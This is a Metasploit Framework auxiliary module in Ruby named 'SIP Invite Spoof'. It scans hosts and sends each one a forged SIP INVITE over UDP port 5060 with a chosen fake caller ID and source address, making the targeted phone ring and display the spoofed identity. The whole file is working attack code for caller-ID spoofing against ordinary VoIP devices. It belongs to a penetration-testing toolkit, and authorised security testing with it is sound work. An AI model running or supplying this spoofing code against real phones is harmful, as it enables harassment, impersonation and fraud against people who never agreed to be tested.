##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Udp
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'           => 'SIP Invite Spoof',
			'Description'    => %q{
				This module will create a fake SIP invite request making the targeted device ring
				and display fake caller id information.
			},
			'Author'         =>
				[
					'David Maynor <dave[at]erratasec.com>',
					'ChrisJohnRiley'
				],
			'License'        =>  MSF_LICENSE
		)

		deregister_options('Proxies','SSL','RHOST')
		register_options(
			[
				Opt::RPORT(5060),
				OptString.new('SRCADDR', [true, "The sip address the spoofed call is coming from",'192.168.1.1']),
				OptString.new('MSG', [true, "The spoofed caller id to send","The Metasploit has you"]),
				OptString.new('EXTENSION', [false, "The specific extension or name to target", nil])
			], self.class)
	end


	def run_host(ip)

		begin

			name = datastore['MSG']
			src = datastore['SRCADDR']
			ext = datastore['EXTENSION']

			if not ext.nil? and not ext.empty?
				# set extesion name/number
				conn_string = "#{ext}@#{ip}"
			else
				conn_string = "#{ip}"
			end

			connect_udp

			print_status("Sending Fake SIP Invite to: #{conn_string}")

			req =  "INVITE sip:#{conn_string} SIP/2.0" + "\r\n"
			req << "To: <sip:#{conn_string}>" + "\r\n"
			req << "Via: SIP/2.0/UDP #{ip}" + "\r\n"
			req << "From: \"#{name}\"<sip:#{src}>" + "\r\n"
			req << "Call-ID: #{(rand(100)+100)}#{ip}" + "\r\n"
			req << "CSeq: 1 INVITE" + "\r\n"
			req << "Max-Forwards: 20" +  "\r\n"
			req << "Contact: <sip:#{conn_string}>" + "\r\n\r\n"

			udp_sock.put(req)
			disconnect_udp

		rescue Errno::EACCES
		end

	end
end
